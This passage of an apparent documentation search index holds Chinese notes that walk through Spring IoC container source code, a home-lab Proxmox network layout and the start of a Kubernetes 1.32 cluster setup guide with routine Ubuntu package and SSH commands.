namedBean.getBeanInstance();\n                resolvedName = namedBean.getBeanName();\n            }\n            else {\n                resolvedName = String.valueOf(doEvaluate(ref.getBeanName()));\n                bean = this.beanFactory.getBean(resolvedName);\n            }\n            this.beanFactory.registerDependentBean(resolvedName, this.beanName);\n        }\n        if (bean instanceof NullBean) {\n            bean = null;\n        }\n        return bean;\n    }\n    catch (BeansException ex) {\n        throw new BeanCreationException(\n                this.beanDefinition.getResourceDescription(), this.beanName,\n                \"Cannot resolve reference to bean '\" + ref.getBeanName() + \"' while setting \" + argName, ex);\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#abstractpropertyaccessorsetpropertyvaluespropertyvalues-pvs","title":"AbstractPropertyAccessor\u200b\u7684\u200bsetPropertyValues(PropertyValues pvs)\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b\uff1aorg.springframework.beans.AbstractPropertyAccessor</li> <li>\u200b\u5faa\u73af\u200b\u5c5e\u6027\u200b\u5217\u8868\u200b  Java<pre><code>@Override\npublic void setPropertyValues(PropertyValues pvs) throws BeansException {\n    setPropertyValues(pvs, false, false);\n}\n\n//  \u200b\u5faa\u73af\u200b\u5c5e\u6027\u200b\u5217\u8868\u200b \n@Override\npublic void setPropertyValues(PropertyValues pvs, boolean ignoreUnknown, boolean ignoreInvalid)\n        throws BeansException {\n\n    List&lt;PropertyAccessException&gt; propertyAccessExceptions = null;\n    List&lt;PropertyValue&gt; propertyValues = (pvs instanceof MutablePropertyValues ?\n            ((MutablePropertyValues) pvs).getPropertyValueList() : Arrays.asList(pvs.getPropertyValues()));\n    // \u200b\u5faa\u73af\u200b\u5c5e\u6027\u200b\u5217\u8868\u200b \n    for (PropertyValue pv : propertyValues) {\n        try {\n            // This method may throw any BeansException, which won't be caught\n            // here, if there is a critical failure such as no matching field.\n            // We can attempt to deal only with less serious exceptions.\n            // \u200b\u8be5\u200b\u65b9\u6cd5\u200b\u901a\u8fc7\u200bAbstractNestablePropertyAccessor\u200b\u7684\u200bsetPropertyValue(PropertyValue pv)\u200b\u65b9\u6cd5\u200b\u5b9e\u73b0\u200b\n            setPropertyValue(pv);\n        }\n        catch (NotWritablePropertyException ex) {\n            if (!ignoreUnknown) {\n                throw ex;\n            }\n            // Otherwise, just ignore it and continue...\n        }\n        catch (NullValueInNestedPathException ex) {\n            if (!ignoreInvalid) {\n                throw ex;\n            }\n            // Otherwise, just ignore it and continue...\n        }\n        catch (PropertyAccessException ex) {\n            if (propertyAccessExceptions == null) {\n                propertyAccessExceptions = new ArrayList&lt;&gt;();\n            }\n            propertyAccessExceptions.add(ex);\n        }\n    }\n\n    // If we encountered individual exceptions, throw the composite exception.\n    if (propertyAccessExceptions != null) {\n        PropertyAccessException[] paeArray = propertyAccessExceptions.toArray(new PropertyAccessException[0]);\n        throw new PropertyBatchUpdateException(paeArray);\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#abstractnestablepropertyaccessor-setpropertyvaluepropertyvalue-pv","title":"AbstractNestablePropertyAccessor\u200b\u7684\u200b setPropertyValue(PropertyValue pv)\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b\uff1aorg.springframework.beans.AbstractNestablePropertyAccessor Java<pre><code>@Override\n    public void setPropertyValue(PropertyValue pv) throws BeansException {\n        PropertyTokenHolder tokens = (PropertyTokenHolder) pv.resolvedTokens;\n        if (tokens == null) {\n            String propertyName = pv.getName();\n            AbstractNestablePropertyAccessor nestedPa;\n            try {\n                nestedPa = getPropertyAccessorForPropertyPath(propertyName);\n            }\n            catch (NotReadablePropertyException ex) {\n                throw new NotWritablePropertyException(getRootClass(), this.nestedPath + propertyName,\n                        \"Nested property in path '\" + propertyName + \"' does not exist\", ex);\n            }\n            tokens = getPropertyNameTokens(getFinalPath(nestedPa, propertyName));\n            if (nestedPa == this) {\n                pv.getOriginalPropertyValue().resolvedTokens = tokens;\n            }\n            nestedPa.setPropertyValue(tokens, pv);\n        }\n        else {\n            setPropertyValue(tokens, pv);\n        }\n    }\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#_7","title":"Spring-IoC\u200b\u5bb9\u5668\u200b\u6e90\u7801\u200b\u5bfc\u8bfb","text":"<ul> <li>\u200b\u4e0a\u9762\u200bsetPropertyValue(PropertyValue pv)\u200b\u65b9\u6cd5\u200b\u7684\u200b\u91cd\u8f7d\u200b\u65b9\u6cd5\u200bsetPropertyValue(PropertyTokenHolder tokens, PropertyValue pv) Java<pre><code>protected void setPropertyValue(PropertyTokenHolder tokens, PropertyValue pv) throws BeansException {\n    if (tokens.keys != null) {\n        processKeyedProperty(tokens, pv);\n    }\n    else {\n        processLocalProperty(tokens, pv);\n    }\n}\n</code></pre></li> <li>processLocalProperty(PropertyTokenHolder tokens, PropertyValue pv)\u200b\u65b9\u6cd5\u200b Java<pre><code>private void processLocalProperty(PropertyTokenHolder tokens, PropertyValue pv) {\n    PropertyHandler ph = getLocalPropertyHandler(tokens.actualName);\n    if (ph == null || !ph.isWritable()) {\n        if (pv.isOptional()) {\n            if (logger.isDebugEnabled()) {\n                logger.debug(\"Ignoring optional value for property '\" + tokens.actualName +\n                        \"' - property not found on bean class [\" + getRootClass().getName() + \"]\");\n            }\n            return;\n        }\n        else {\n            throw createNotWritablePropertyException(tokens.canonicalName);\n        }\n    }\n\n    Object oldValue = null;\n    try {\n        Object originalValue = pv.getValue();//\n        Object valueToApply = originalValue;//\n        if (!Boolean.FALSE.equals(pv.conversionNecessary)) {\n            if (pv.isConverted()) {\n                valueToApply = pv.getConvertedValue();\n            }\n            else {\n                if (isExtractOldValueForEditor() &amp;&amp; ph.isReadable()) {\n                    try {\n                        oldValue = ph.getValue();\n                    }\n                    catch (Exception ex) {\n                        if (ex instanceof PrivilegedActionException) {\n                            ex = ((PrivilegedActionException) ex).getException();\n                        }\n                        if (logger.isDebugEnabled()) {\n                            logger.debug(\"Could not read previous value of property '\" +\n                                    this.nestedPath + tokens.canonicalName + \"'\", ex);\n                        }\n                    }\n                }\n                valueToApply = convertForProperty(\n                        tokens.canonicalName, oldValue, originalValue, ph.toTypeDescriptor());\n            }\n            pv.getOriginalPropertyValue().conversionNecessary = (valueToApply != originalValue);\n        }\n        ph.setValue(valueToApply);// \u200b\u5177\u4f53\u200b\u4ee3\u7801\u200b\u5728\u200b\u4e0b\u65b9\u200b\u5217\u51fa\u200b\n    }\n    catch (TypeMismatchException ex) {\n        throw ex;\n    }\n    catch (InvocationTargetException ex) {\n        PropertyChangeEvent propertyChangeEvent = new PropertyChangeEvent(\n                getRootInstance(), this.nestedPath + tokens.canonicalName, oldValue, pv.getValue());\n        if (ex.getTargetException() instanceof ClassCastException) {\n            throw new TypeMismatchException(propertyChangeEvent, ph.getPropertyType(), ex.getTargetException());\n        }\n        else {\n            Throwable cause = ex.getTargetException();\n            if (cause instanceof UndeclaredThrowableException) {\n                // May happen e.g. with Groovy-generated methods\n                cause = cause.getCause();\n            }\n            throw new MethodInvocationException(propertyChangeEvent, cause);\n        }\n    }\n    catch (Exception ex) {\n        PropertyChangeEvent pce = new PropertyChangeEvent(\n                getRootInstance(), this.nestedPath + tokens.canonicalName, oldValue, pv.getValue());\n        throw new MethodInvocationException(pce, ex);\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#_8","title":"Spring-IoC\u200b\u5bb9\u5668\u200b\u6e90\u7801\u200b\u5bfc\u8bfb","text":"<ul> <li>\u200b\u4e0a\u8ff0\u200bph.setValue\u200b\u65b9\u6cd5\u200b\u5728\u200borg.springframework.beans.AbstractNestablePropertyAccessor\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200b\u5b9a\u4e49\u200b</li> <li>public abstract void setValue(@Nullable Object value) throws Exception; </li> <li>\u200b\u4e00\u4e2a\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u5728\u200borg.springframework.beans.BeanWrapperImp\u200b\u7684\u200b\u5185\u90e8\u200b\u7c7b\u200bBeanPropertyHandler\u200b\u4e2d\u200b\uff0c\u200b\u5b8c\u6574\u200b\u4ee3\u7801\u200b\u5982\u4e0b\u200b\uff1a Java<pre><code>private final PropertyDescriptor pd;  //BeanPropertyHandler\u200b\u4e2d\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\n\n@Override\npublic void setValue(final @Nullable Object value) throws Exception {\n    final Method writeMethod = (this.pd instanceof GenericTypeAwarePropertyDescriptor ?\n            ((GenericTypeAwarePropertyDescriptor) this.pd).getWriteMethodForActualAccess() :\n            this.pd.getWriteMethod());// \u200b\u627e\u5230\u200b\u5c5e\u6027\u200b\u7684\u200bset\u200b\u65b9\u6cd5\u200b\n    if (System.getSecurityManager() != null) {\n        AccessController.doPrivileged((PrivilegedAction&lt;Object&gt;) () -&gt; {\n            ReflectionUtils.makeAccessible(writeMethod);\n            return null;\n        });\n        try {\n            AccessController.doPrivileged((PrivilegedExceptionAction&lt;Object&gt;) () -&gt;\n                    writeMethod.invoke(getWrappedInstance(), value), acc);\n                    // \u200b\u8c03\u7528\u200bMethod\u200b\u7684\u200binvoke\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5b8c\u6210\u200b\u5c5e\u6027\u200b\u6ce8\u5165\u200b\n        }\n        catch (PrivilegedActionException ex) {\n            throw ex.getException();\n        }\n    }\n    else {\n        ReflectionUtils.makeAccessible(writeMethod);\n        writeMethod.invoke(getWrappedInstance(), value);//\u200b\u8c03\u7528\u200bMethod\u200b\u7684\u200binvoke\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5b8c\u6210\u200b\u5c5e\u6027\u200b\u6ce8\u5165\u200b\n    }\n}\n</code></pre></li> <li>\u200b\u81f3\u6b64\u200bIoc\u200b\u5bb9\u5668\u200b\u7684\u200b\u542f\u52a8\u200b\u8fc7\u7a0b\u200b\u57fa\u672c\u200b\u7ed3\u675f\u200b</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#15-finishrefresh","title":"15. finishRefresh();\u200b\u65b9\u6cd5","text":"<ul> <li>org.springframework.context.support.AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200bfinishRefresh()\u200b\u65b9\u6cd5\u200b</li> </ul> Java<pre><code>protected void finishRefresh() {\n    // Clear context-level resource caches (such as ASM metadata from scanning).\n    clearResourceCaches();\n\n    // Initialize lifecycle processor for this context.\n    initLifecycleProcessor();\n\n    // Propagate refresh to lifecycle processor first.\n    getLifecycleProcessor().onRefresh();\n\n    // Publish the final event.\n    publishEvent(new ContextRefreshedEvent(this));\n\n    // Participate in LiveBeansView MBean, if active.\n    LiveBeansView.registerApplicationContext(this);\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#16refresh","title":"16refresh()\u200b\u8fc7\u7a0b\u200b\u629b\u51fa\u200b\u5f02\u5e38\u200b\u65f6","text":"<ul> <li>\u200b\u4e4b\u4e2d\u200b\u6709\u200b\u4e24\u4e2a\u200b\u5904\u7406\u200b\u65b9\u6cd5\u200bdestroyBeans()\u200b\u548c\u200bcancelRefresh(ex)</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#161-destroybeans","title":"16.1 destroyBeans();\u200b\u65b9\u6cd5","text":"<ul> <li>org.springframework.context.support.AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200bdestroyBeans()\u200b\u65b9\u6cd5\u200b</li> </ul> Java<pre><code>protected void destroyBeans() {\n    getBeanFactory().destroySingletons();\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#162-cancelrefreshex","title":"16.2 cancelRefresh(ex);\u200b\u65b9\u6cd5","text":"<ul> <li>org.springframework.context.support.AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200bcancelRefresh(ex)\u200b\u65b9\u6cd5\u200b Java<pre><code>protected void cancelRefresh(BeansException ex) {\n    this.active.set(false);\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#163beansexception","title":"16.3\u200b\u629b\u51fa\u200b\u5f02\u5e38\u200bBeansException","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#17-resetcommoncaches","title":"17 resetCommonCaches();\u200b\u65b9\u6cd5","text":"<ul> <li>org.springframework.context.support.AbstractApplicationContext\u200b\u4e2d\u200b\u7684\u200bresetCommonCaches()\u200b\u65b9\u6cd5\u200b</li> <li>try-catch-finally\u200b\u4ee3\u7801\u200b\u5757\u200b\u4e2d\u200bfinally\u200b\u5305\u88f9\u200b\u7684\u200b\u65b9\u6cd5\u200b Java<pre><code>protected void resetCommonCaches() {\n    ReflectionUtils.clearCache();\n    AnnotationUtils.clearCache();\n    ResolvableType.clearCache();\n    CachedIntrospectionResults.clearClassLoader(getClassLoader());\n}\n</code></pre></li> <li>\u200b\u6267\u884c\u200b\u5230\u200b\u6b64\u200bIoc\u200b\u5bb9\u5668\u200b\u542f\u52a8\u200b\u5b8c\u6210\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6b63\u5f0f\u200b\u6295\u5165\u4f7f\u7528\u200b</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#_9","title":"\u603b\u7ed3","text":"<ul> <li>Ioc\u200b\u7684\u200b\u5e95\u5c42\u200b\u539f\u7406\u200b\u5b9e\u73b0\u200b\uff1aSpring Ioc\u200b\u542f\u52a8\u200b\u5206\u4e3a\u200b\u4e24\u6b65\u200b\uff1a<ul> <li>1.\u200b\u521b\u5efa\u200bBeanFactory</li> <li>2.\u200b\u5b9e\u4f8b\u200b\u5316\u200bBean</li> </ul> </li> <li>Spring\u200b\u7684\u200bBean\u200b\u5728\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u72b6\u6001\u200b\u5c31\u662f\u200bBeanDefination</li> <li>\u200b\u5728\u200bBean\u200b\u7684\u200b\u521b\u5efa\u200b\u548c\u200b\u4f9d\u8d56\u200b\u6ce8\u5165\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\uff0c\u200b\u9700\u8981\u200b\u6839\u636e\u200bBeanDefination\u200b\u7684\u200b\u4fe1\u606f\u200b\u6765\u200b\u9012\u5f52\u200b\u7684\u200b\u5b8c\u6210\u200b\u4f9d\u8d56\u200b\u6ce8\u5165\u200b\uff0c\u200b\u4ece\u200b\u4ee3\u7801\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u9012\u5f52\u200b\u90fd\u200b\u662f\u200b\u4ee5\u200bgetBean()\u200b\u4e3a\u200b\u5165\u53e3\u200b\u7684\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u9012\u5f52\u200b\u662f\u200b\u5728\u200b\u4e0a\u4e0b\u6587\u200b\u4f53\u7cfb\u200b\u4e2d\u200b\u67e5\u627e\u200b\u9700\u8981\u200b\u7684\u200bbean\u200b\u548c\u200bbean\u200b\u7684\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\uff1b\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u9012\u5f52\u200b\u662f\u200b\u5728\u200b\u4f9d\u8d56\u200b\u6ce8\u5165\u200b\u65f6\u200b\uff0c\u200b\u901a\u8fc7\u200b\u9012\u5f52\u200b\u8c03\u7528\u200b\u5bb9\u5668\u200b\u7684\u200bgetBean\u200b\u65b9\u6cd5\u200b\u5f97\u5230\u200b\u5f53\u524d\u200b\u4f9d\u8d56\u200b\u7684\u200bBean\uff0c\u200b\u540c\u65f6\u200b\u4e5f\u200b\u89e6\u53d1\u200b\u5bf9\u200b\u4f9d\u8d56\u200bbean\u200b\u7684\u200b\u521b\u5efa\u200b\u548c\u200b\u6ce8\u5165\u200b\u3002\u200b\u5728\u200b\u5bf9\u200bbean\u200b\u7684\u200b\u5c5e\u6027\u200b\u8fdb\u884c\u200b\u4f9d\u8d56\u200b\u6ce8\u5165\u200b\u65f6\u200b\uff0c\u200b\u89e3\u6790\u200b\u8fc7\u7a0b\u200b\u4e5f\u200b\u662f\u200b\u4e00\u4e2a\u200b\u9012\u5f52\u200b\u8fc7\u7a0b\u200b\uff0c\u200b\u8fd9\u6837\u200b\u6839\u636e\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\uff0c\u200b\u4e00\u5c42\u200b\u4e00\u5c42\u200b\u7684\u200b\u5b8c\u6210\u200bBean\u200b\u7684\u200b\u521b\u5efa\u200b\u548c\u200b\u6ce8\u5165\u200b\uff0c\u200b\u76f4\u5230\u200b\u5f53\u524d\u200bbean\u200b\u76f8\u5173\u200b\u7684\u200b\u6574\u4e2a\u200b\u4f9d\u8d56\u200b\u94fe\u200b\u7684\u200b\u6ce8\u5165\u200b\u5b8c\u6210\u200b\u3002\u200b\u7531\u4e8e\u200b\u6574\u4e2a\u200bIoC\u200b\u5bb9\u5668\u200b\u542f\u52a8\u200b\u8fc7\u7a0b\u200b\u8f83\u4e3a\u200b\u590d\u6742\u200b\uff0c\u200b\u4f7f\u7528\u200b\u4e0b\u9762\u200b\u7684\u200b\u4e00\u5f20\u200b\u56fe\u6765\u200b\u63cf\u8ff0\u200b\u8ba9\u200b\u8bfb\u8005\u200b\u66f4\u200b\u6e05\u695a\u200b\u5398\u6e05\u200bIoC\u200b\u5bb9\u5668\u200b\u7684\u200b\u542f\u52a8\u200b\u8fc7\u7a0b\u200b\u3002</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#_10","title":"\u6a21\u677f","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.context.support.AbstractApplicationContext.java Java<pre><code>protected void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) {\n\n}\n</code></pre></li> <li> <p>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.context.support.AbstractApplicationContext.java Java<pre><code>\n</code></pre></p> </li> <li> <p>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:.java Java<pre><code>\n</code></pre></p> </li> <li> <p>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:.java Java<pre><code>\n</code></pre></p> </li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#_11","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>Spring-IoC\u200b\u5bb9\u5668\u200b\u6e90\u7801\u200b\u5bfc\u8bfb\u200b</li> <li>Spring\u200b\u6e90\u7801\u200b\u6df1\u5ea6\u200b\u89e3\u6790\u200b\uff08\u200b\u7b2c\u4e8c\u200b\u7248\u200b\uff09 \u200b\u90dd\u4f73\u200b</li> <li>Spring5\u200b\u4f01\u4e1a\u7ea7\u200b\u5f00\u53d1\u200b\u5b9e\u6218\u200b \u200b\u5468\u200b\u51a0\u4e9a\u200b \u200b\u9ec4\u6587\u6bc5\u200b \u200b\u914d\u5957\u200b\u6e90\u7801\u200b</li> <li>Gitee\u200b\u540c\u6b65\u200b\u7248\u672c\u200b\uff1ahttps://gitee.com/ACANX/spring5projectdemo</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"3/1/","title":"Kubernetes\u200b\u5bb9\u5668\u200b\u7f16\u6392\u200b\u7cfb\u7edf\u200b\u6982\u5ff5\u6a21\u578b","text":""},{"location":"3/1/#_1","title":"\u6574\u4f53\u200b\u67b6\u6784","text":"<p>\u200b\u539f\u56fe\u200b\u7684\u200b\u94fe\u63a5\u200b\u4e3a\u200b\uff1ahttps://www.processon.com/v/63942170daf0d42ad937e9f8</p> <p> </p> <p>\u200b\u672c\u6b21\u200b\u7f51\u7edc\u200b\u67b6\u6784\u200b\u53ea\u7528\u200b\u5230\u200b\u4e86\u200b\u534a\u8f7d\u200b\u7684\u200b 2 \u200b\u4e2a\u200b 2.5G \u200b\u7f51\u53e3\u200b\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u5b9e\u73b0\u200b\u56fe\u4e0a\u200b\u8fd9\u4e9b\u200b\u529f\u80fd\u200b 1 \u200b\u4e2a\u200b\u7f51\u53e3\u200b\u8db3\u4ee5\u200b\uff0c\u200b\u8fd9\u200b\u91cc\u9762\u200b\u7684\u200b eth2 \u200b\u53ea\u662f\u200b\u4e3a\u4e86\u200b\u65b9\u4fbf\u200b\u540e\u7eed\u200b\u6211\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5916\u6302\u200b\u8def\u7531\u5668\u200b\u6765\u200b\u4f7f\u7528\u200b\u3002 </p>"},{"location":"3/1/#_2","title":"\u67b6\u6784\u200b\u89e3\u91ca","text":"<p>\u200b\u56fe\u4e0a\u200b\u7684\u200b\u673a\u6784\u200b\u662f\u200b\u6839\u636e\u200b\u6211\u200b\u7684\u200b\u5b9e\u9645\u200b\u9700\u6c42\u200b\u6765\u200b\u8bbe\u8ba1\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4ec5\u4f9b\u200b\u5927\u5bb6\u200b\u53c2\u8003\u200b\u4e00\u4e0b\u200b\uff1a</p> <ol> <li>\u200b\u56e0\u4e3a\u200b\u662f\u200b\u79df\u200b\u7684\u200b\u623f\u5b50\u200b\uff0c\u200b\u697c\u4e0a\u200b\u79df\u5ba2\u200b\u4e5f\u200b\u662f\u200b\u76f4\u200b\u63d2\u200b\u7684\u200b\u5149\u732b\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u200b\u4e0d\u80fd\u200b\u8ba9\u200b\u5149\u732b\u200b\u4e0d\u80fd\u200b\u8d70\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\uff08\u200b\u5bf9\u5149\u200b\u732b\u200b\u7684\u200b\u8d1f\u62c5\u200b\u6709\u70b9\u200b\u5927\u200b\u4e86\u200b\uff09</li> <li>\u200b\u5212\u5206\u200b\u5355\u72ec\u200b\u7684\u200b 1 \u200b\u4e2a\u200b\u7f51\u6bb5\u200b\u8dd1\u200b\u5b89\u5168\u200b\u9776\u573a\u200b\uff0c\u200b\u8981\u200b\u548c\u200b\u751f\u4ea7\u533a\u200b\uff08\u200b\u4e0d\u540c\u200b\u7f51\u6bb5\u200b\u9ed8\u8ba4\u200b\u9694\u79bb\u200b\uff09\u200b\u548c\u200b\u5bb6\u5ead\u7f51\u7edc\u200b\u533a\u200b\u9694\u79bb\u200b\uff08\u200b\u9700\u8981\u200b OpenWrt \u200b\u914d\u7f6e\u200b\u9632\u706b\u5899\u200b\uff09</li> <li>\u200b\u65e5\u5e38\u200b\u7684\u200b\u624b\u673a\u200b\u6709\u65f6\u5019\u200b\u9700\u8981\u200b\u8bbf\u95ee\u200b NAS \u200b\u7b49\u200b\u8d44\u6e90\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5c06\u200b\u9ed1\u200b\u7fa4\u6656\u200b\u8fd9\u4e9b\u200b\u5355\u72ec\u200b\u4f7f\u7528\u200b vmbr0 \u200b\u7f51\u6865\u200b</li> <li>eht2 \u200b\u7269\u7406\u200b\u7f51\u53e3\u200b\u672a\u6765\u200b\u53ef\u4ee5\u200b\u5916\u6302\u200b 1 \u200b\u4e2a\u200b\u8def\u7531\u5668\u200b\u53ea\u200b\u5173\u6389\u200b DHCP \u200b\u53ea\u200b\u5f53\u505a\u200b AP \u200b\u6765\u200b\u4f7f\u7528\u200b\uff0c\u200b\u76ee\u524d\u200b\u662f\u200b\u505a\u200b\u4e34\u65f6\u200b\u7f51\u7ebf\u200b\u63d2\u200b\u7b14\u8bb0\u672c\u200b\u4f7f\u7528\u200b</li> </ol>"},{"location":"3/2/","title":"\u524d\u8a00","text":"<p>Kubernetes\u200b\u96c6\u7fa4\u200b\u90e8\u7f72\u200b\u5b9e\u6218\u200b\uff0c\u200b\u57fa\u4e8e\u200bKubernetes v1.32.3\u3001Ubuntu 24.04.2 LTS\u3001Containerd v1.7.27\u200b\u7248\u672c\u200b\u642d\u5efa\u200b\u3002</p>"},{"location":"3/2/#11","title":"1.1 \u200b\u524d\u7f6e\u200b\u51c6\u5907","text":""},{"location":"3/2/#111","title":"1.1.1 \u200b\u524d\u7f6e\u200b\u4f9d\u8d56\u200b\u8f6f\u4ef6\u200b\u53ca\u200b\u7269\u6599\u200b\u51c6\u5907","text":"<ul> <li>\u200b\u670d\u52a1\u5668\u200b\u7cfb\u7edf\u200b\uff1aPVE 8.1 </li> <li>\u200b\u865a\u62df\u673a\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b Ubuntu 24.04.2 LTS ISO</li> <li>Kubernetes v1.32.3 \uff08kubeadm\u3001kubelet\u3001kubectl\u3001kube-apiserver\u3001kube-controller-manager\u3001kube-scheduler\u3001kube-proxy\uff09</li> <li>Cri-Containerd v1.7.27    releases       crictl</li> <li>CoreDNS v1.11.3</li> <li>Pause v3.10</li> <li>Etcd v3.5.16-0</li> <li>Calico v3.29.2</li> <li>Nginx\u200b\u955c\u50cf\u200b</li> <li>Helm v3.17.2</li> <li>Kubernetes Dashboard v7.11.1</li> </ul>"},{"location":"3/2/#112-k8sip","title":"1.1.2 K8S\u200b\u96c6\u7fa4\u200b\u7f51\u7edc\u200bIP\u200b\u89c4\u5212","text":"\u8282\u70b9\u200b\u540d\u79f0\u200b \u200b\u89c4\u5212\u200bIP \u200b\u5f53\u524d\u200b\u9a8c\u8bc1\u200b\u5b9e\u9645\u200b\u4f7f\u7528\u200bIP \u200b\u5907\u6ce8\u200b K8S-Master01 10.200.10.11 192.168.11.161 ... K8S-Master02 10.200.10.12 ... K8S-Master03 10.200.10.13 ... k8S-Worker01 10.200.10.21 192.168.11.165 ... K8S-Worker02 10.200.10.22 192.168.11.166 ... K8S-Worker03 10.200.10.23 ... K8S-Worker04 10.200.10.24 ... K8S-Worker05 10.200.10.25 ..."},{"location":"3/2/#113","title":"1.1.3 \u200b\u4e3b\u673a\u200b\u786c\u4ef6\u200b\u914d\u7f6e\u200b\u8bf4\u660e","text":"\u8282\u70b9\u200b\u540d\u79f0\u200b \u200b\u89d2\u8272\u200b CPU \u200b\u5185\u5b58\u200b \u200b\u786c\u76d8\u200b \u200b\u5907\u6ce8\u200b K8S-Master01 master 4C 8G 200GB \u200b\u6700\u4f4e\u200b4C8G k8S-Worker01 worker 8C 16G 200GB \u200b\u6700\u4f4e\u200b8C16G K8S-Worker02 worker 8C 16G 200GB \u200b\u6700\u4f4e\u200b8C16G"},{"location":"3/2/#12","title":"1.2 \u200b\u4e3b\u673a\u200b\u7cfb\u7edf\u200b\u57fa\u7840\u200b\u73af\u5883\u200b\u51c6\u5907","text":""},{"location":"3/2/#121","title":"1.2.1 \u200b\u6b63\u5f0f\u200b\u5b89\u88c5\u200b\u524d\u200b\uff0c\u200b\u7cfb\u7edf\u200b\u9700\u8981\u200b\u68c0\u67e5\u200b\u53ca\u200b\u51c6\u5907\u200b\u4ee5\u4e0b\u200b\u64cd\u4f5c","text":"<ul> <li>\u200b\u66f4\u65b0\u200b\u57fa\u7840\u200b\u8f6f\u4ef6\u200b\u7248\u672c\u200b  </li> <li>\u200b\u5b89\u88c5\u200b net-tools\u3001iputils-ping \u200b\u5de5\u5177\u200b\uff0c\u200b\u67e5\u770b\u200bIP\u200b\u914d\u7f6e\u200b\u3001\u200b\u7f51\u7edc\u200b\u72b6\u51b5\u200b</li> <li>\u200b\u5b89\u88c5\u200b\u5fc5\u8981\u200b\u7684\u200b\u7f16\u8f91\u5668\u200b</li> <li>\u200b\u542f\u7528\u200bSSH\u200b\u8fde\u63a5\u200b OpenSSH  \u200b\u5f00\u542f\u200bSSH\u200b\u670d\u52a1\u200b</li> <li>\u200b\u652f\u6301\u200bcron\u200b\u5b9a\u65f6\u200b\u4efb\u52a1\u200b</li> <li>\u200b\u8fdc\u7a0b\u200b\u65f6\u95f4\u200b\u540c\u6b65\u200b\u670d\u52a1\u200b\u652f\u6301\u200b </li> <li>\u200b\u521d\u59cb\u5316\u200b\u7cfb\u7edf\u200b systemd \u200b\u652f\u6301\u200b\u7a0b\u5e8f\u200b\u5f00\u673a\u200b\u81ea\u542f\u52a8\u200b</li> <li>\u200b\u7f51\u7edc\u200b\u4e0b\u8f7d\u5de5\u5177\u200b\uff1awget\u3001curl</li> <li>\u200b\u7b7e\u540d\u200b\u6821\u9a8c\u200b\u5de5\u5177\u200bgpg</li> </ul> <p>\u200b\u5b89\u88c5\u200b\u5fc5\u8981\u200b\u7684\u200b\u8f6f\u4ef6\u200b\u53ca\u200b\u5de5\u5177\u200b</p> Bash<pre><code>~# sudo apt-get update\n~# sudo apt install net-tools iputils-ping systemd nano openssh-server cron ntpdate ipset ipvsadm debianutils tar which apt-transport-https ca-certificates curl wget gpg -y\n~# sudo apt-get upgrade -y\n</code></pre>"},{"location":"3/2/#122-ssh","title":"1.2.2 \u200b\u5f00\u542f\u200bSSH\u200b\u8fdc\u7a0b\u200b\u767b\u5f55\u200b\u670d\u52a1","text":"<p>\u200b\u786e\u8ba4\u200b\u4f60\u200b\u7684\u200b\u7cfb\u7edf\u200b\u4f7f\u7528\u200b\u7684\u200b\u662f\u200b\u54ea\u79cd\u200b\u521d\u59cb\u5316\u200b\u7cfb\u7edf\u200b\uff1a</p> Bash<pre><code>~# ps -p 1 -o comm=\n</code></pre> Bash<pre><code>~$ sudo systemctl enable ssh\n\n~$ sudo systemctl start ssh\n\n~$ sudo system status ssh      # 